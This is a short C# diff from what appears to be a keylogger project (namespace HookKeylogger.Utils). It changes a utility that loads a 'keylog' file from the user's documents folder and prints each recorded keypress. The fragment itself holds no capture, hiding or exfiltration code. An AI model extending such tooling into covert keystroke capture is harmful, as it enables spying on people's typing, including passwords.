@@ -9,12 +9,12 @@ namespace HookKeylogger.Utils
     {
         static void Main(string[] args)
         {
-            string path = "C:\\path\\to\\keypress\\log";
-            FileStream fs;
-            fs = new FileStream(path, FileMode.OpenOrCreate);
-            KeyPressBuffer kb3 = KeyPressBuffer.Parser.ParseFrom(fs);
-            fs.Close();
-            foreach(KeyPress ks in kb3.Keys)
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\keylog";
+            Console.WriteLine(path);
+            Console.ReadKey();
+            KeyPressBuffer kpb = new KeyPressBuffer(path);
+
+            foreach(KeyPress ks in kpb.Keys)
             {
                 Console.Write(ks.Key);
                 Console.WriteLine((Keys)ks.Key);
